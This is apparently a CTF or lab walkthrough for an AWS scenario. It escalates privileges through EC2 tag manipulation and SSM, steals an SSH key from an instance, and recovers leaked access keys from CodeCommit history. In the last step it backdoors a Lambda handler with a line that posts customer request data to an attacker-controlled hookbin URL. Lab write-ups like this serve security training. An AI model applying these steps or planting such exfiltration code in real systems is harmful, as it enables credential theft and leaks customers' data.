

## Step 1

You are given credentials of an initial IAM user. 

Using the AWS CLI or AWS Console (e.g. using `aws-vault add initial` then `aws-vault login initial --no-session`), note that the IAM policy attached to your user allows it to establish a SSM session on all EC2 instances tagged with `Environment=sandbox`, and to manage tags of all EC2 instances tagged with `Environment=dev`.

Check the running EC2 instances. You notice one is tagged with `Environment=dev`, and you therefore can't SSM to it. Instead, overwrite the `Environment` tag with the value `sandbox`, then establish a SSM session to the instance:

```
aws ec2 create-tags --resources i-xxxx --tags Key=Environment,Value=sandbox
aws ssm start-session --target i-xxxx
```

If ssm start-session does not work make sure to install the ssm [session-manager plugin](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html). 

## Step 2

On the instance, notice the private SSH key stored at `/home/ssm-user/.ssh/id_rsa`.

![Screen Shot 2022-06-21 at 6 29 59 PM](https://user-images.githubusercontent.com/4079939/174924027-54c04c15-a025-40f6-b0ba-be3d143be3d3.png)

- Copy the SSH key to your local machine (`~/.ssh/stolen_key`) and run `chmod 600 ~/.ssh/stolen_key` on it.

Next you can extract the corresponding public key fingerprint to notice it is linked to the CodeCommit credentials of the IAM user `cloner`, who has the permission `codecommit:GitPull` on a repository:

```
$ chmod 600 ~/.ssh/stolen_key
$ ssh-keygen -f ~/.ssh/stolen_key -l -E md5
2048 MD5:c8:86:28:03:a1:d5:af:77:2c:62:6a:73:59:69:c6:ba no comment (RSA)

$ aws iam list-ssh-public-keys --user-name cloner
{
  "SSHPublicKeys": [
    {
      "UserName": "cloner",
      "SSHPublicKeyId": "APKA254BBSGPK2B5K5YQ",
      "Status": "Active",
      "UploadDate": "2021-12-27T10:34:19+00:00"
    }
  ]
}
$ aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id <SSHPublicKeyId found above> --encoding PEM --output text --query 'SSHPublicKey.Fingerprint'
c8:86:28:03:a1:d5:af:77:2c:62:6a:73:59:69:c6:ba
```

## Step 3

Set up your local environment to clone the repository using the [CodeCommit documentation](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-ssh-unixes.html). In short:


- Find the CodeCommit user ID of `cloner` using `aws iam list-ssh-public-keys --user-name cloner --output text --query 'SSHPublicKeys[0].SSHPublicKeyId'`

- Use the following SSH configuration (in your `.ssh/config`):

```
Host git-codecommit.*.amazonaws.com
	IdentityFile ~/.ssh/stolen_key
	PubkeyAcceptedAlgorithms +ssh-rsa
        HostkeyAlgorithms +ssh-rsa
```

- Then, clone the repository using `git clone ssh://<SSH-KEY-ID>@git-codecommit.us-west-2.amazonaws.com/v1/repos/backend-api` (where `SSH-KEY-ID` should look like `APKA2...`)

## Step 4

The repository contains the backend code of the Lambda function exposed through the API gateway. Check the commit history to note a leaked access key:

```diff
commit 576bc9e2979cb780dacefa1cf758dabb29f6b223
Author: christophe <christophe>
Date:   Mon Dec 27 10:38:31 2021 +0000

    Use built-in AWS authentication instead of hardcoded keys

diff --git a/buildspec.yml b/buildspec.yml
index 7130465..4beaa61 100644
--- a/buildspec.yml
+++ b/buildspec.yml
@@ -1,22 +1,20 @@
-      version: 0.2
+version: 0.2
 phases:
   pre_build:
     commands:
-    - export AWS_ACCESS_KEY_ID=AKIA...
-    - export AWS_SECRET_ACCESS_KEY=hnOVW...dtX
     - echo "Authenticating to ECR"
```

## Step 5

These credentials you found belong to the user `developer`, who has pull and push access to this repository. Use this access to backdoor the application and steal the sensitive data that customers are sending to the API!

- For instance, add a piece of code to the checked out repo that sends the secret data to an attacker-controlled server. You can use something similar to what is shown below, if you do, you'll want to first generate your own hookbin link at https://hookbin.com/.

```diff
diff --git a/app.py b/app.py
index 10e7da5..e17a2ba 100644
--- a/app.py
+++ b/app.py
@@ -3,6 +3,7 @@ import json

 def handle(event):
   body = event.get('body')
+  import requests; requests.post("https://hookbin.com/kx...", data=body)
   if body is None:
     return 400, "missing body"
```



- Ensure the credentials you found above are set in your environment or a profile.

```
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=hnOVW...dtX
```

- You can then commit the file and push it with the following AWS command:

```
$ aws codecommit get-branch --repository-name backend-api  --branch-name master
{
    "branch": {
        "branchName": "master",
        "commitId": "e6a2c7...."
    }
}

$ aws codecommit put-file --repository-name backend-api --branch-name master --file-content fileb://./app.py --file-path app.py --parent-commit-id <Commit ID found above>
```


Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. It may take a bit to deploy, give it some time and you should see the flag show up on hookbin if you used the method above (you may need to refresh the page though).
